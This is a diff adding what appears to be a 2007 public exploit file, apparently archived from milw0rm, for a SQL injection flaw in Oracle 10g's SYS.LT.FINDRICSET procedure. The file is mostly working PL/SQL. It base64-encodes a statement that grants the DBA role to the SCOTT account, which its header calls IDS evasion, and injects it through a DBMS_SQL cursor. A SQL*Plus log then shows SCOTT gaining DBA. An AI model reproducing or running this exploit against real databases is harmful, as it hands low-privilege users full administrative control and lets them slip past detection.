@@ -1,0 +1,50 @@
+/******************************************************************/
+/******* Oracle 10g LT.FINDRICSET  SQL Injection Exploit **********/
+/******************************************************************/
+/***********       sploit grant DBA to scott         **************/
+/***********         evil cursor injection           **************/
+/***********  No "create procedure" privileg needed! **************/
+/***********     + Funny IDS evasion vith base64     **************/
+/******************************************************************/
+/***************** tested on oracle 10.1.0.2.0  *******************/
+/******************************************************************/
+/******************************************************************/
+/*         Date of Public EXPLOIT:  October 26, 2007              */
+/*         Written by:              Alexandr "Sh2kerr" Polyakov   */
+/*         email:                   Alexandr.Polyakov@dsec.ru     */
+/*         site:                    http://www.dsec.ru            */
+/******************************************************************/
+/*  Original Advisory by:                                         */
+/*        David Litchfield [ davidl@ngssoftware.com ]             */
+/*        Reported: 22nd August 2006                              */
+/*        Date of Public Advisory: October 17, 2007               */
+/*        Advisory number: #NISR17102007B                         */
+/*                                                                */
+/******************************************************************/
+/* P.S. Special thanks David Litchfield for all his work         **/
+/******************************************************************/
+
+
+/*  you may need some tweaks to make it work with other users except skott  :)  */
+
+
+select * from user_role_privs;
+
+
+DECLARE
+c2gya2Vy NUMBER;
+BEGIN
+  c2gya2Vy := DBMS_SQL.OPEN_CURSOR;
+DBMS_SQL.PARSE(c2gya2Vy,utl_encode.text_decode('ZGVjbGFyZSBwcmFnbWEgYXV0b25vbW91c190cmFuc2FjdGlvbjsgYmVnaW4gZXhlY3V0ZSBpbW1lZGlhdGUgJ0dSQU5UIERCQSBUTyBTQ09UV
+
+Cc7Y29tbWl0O2VuZDs=','WE8ISO8859P1', UTL_ENCODE.BASE64),0);
+  SYS.LT.FINDRICSET('TGV2ZWwgMSBjb21sZXRlIDop.U2VlLnUubGF0ZXIp''||dbms_sql.execute('||c2gya2Vy||')||''','DEADBEAF');
+END;
+
+
+select * from user_role_privs;
+
+-----------------------------LOG---------------------------------------------
+-- -- --SQL*Plus: Release 10.1.0.2.0 - Production on Fri Oct 26 16:51:39 2007 -- --Copyright (c) 1982, 2004, Oracle. All rights reserved. -- -- --Connected to: --Oracle Database 10g Enterprise Edition Release 10.1.0.2.0 - Production --With the Partitioning, OLAP and Data Mining options -- -- -- --SQL> select * from user_role_privs; -- --USERNAME GRANTED_ROLE ADM DEF OS_ -------------------------------- ------------------------------ --- --- --- --SCOTT CONNECT NO YES NO --SCOTT RESOURCE NO YES NO -- --SQL> DECLARE -- 2 c2gya2Vy NUMBER; -- 3 BEGIN -- 4 c2gya2Vy := DBMS_SQL.OPEN_CURSOR; -- 5 DBMS_SQL.PARSE(c2gya2Vy,utl_encode.text_decode('ZGVjbGFyZSBwcmFnbWEgYXV0b25 --vbW91c190cmFuc2FjdGlvbjsgYmVnaW4gZXhlY3V0ZSBpbW1lZGlhdGUgJ0dSQU5UIERCQSBUTyBTQ09 --UVCc7Y29tbWl0O2VuZDs=','WE8ISO8859P1', UTL_ENCODE.BASE64),0); --6 SYS.LT.FINDRICSET('TGV2ZWwgMSBjb21sZXRlIDop.U2VlLnUubGF0ZXIp''||dbms_sql. --execute('||c2gya2Vy||')||''','DEADBEAF'); --7 END; --8 / --TGV2ZWWGMSBJB21SZXRLIDOP.U2VLLNUUBGF0ZXIP1 -- --PL/SQL procedure successfully completed. -- --SQL> select * from user_role_privs; -- --USERNAME GRANTED_ROLE ADM DEF OS_ -------------------------------- ------------------------------ --- --- --- --SCOTT CONNECT NO YES NO --SCOTT DBA NO YES NO --SCOTT RESOURCE NO YES NO -- --SQL> -- -- --
+
+// milw0rm.com [2007-10-27]
